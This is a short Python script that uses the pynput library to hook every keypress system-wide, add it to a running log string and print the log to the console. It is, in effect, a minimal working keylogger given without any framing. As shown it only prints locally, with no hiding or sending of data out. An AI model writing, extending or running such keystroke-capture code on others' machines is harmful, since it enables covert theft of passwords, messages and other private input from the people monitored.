import pynput.keyboard

log = ""

def process_key_press(key):
    global log
    log = log + str(key)
    print(log)

keyboard_listener = pynput.keyboard.Listener(on_press=process_key_press)
with keyboard_listener:
    keyboard_listener.join()
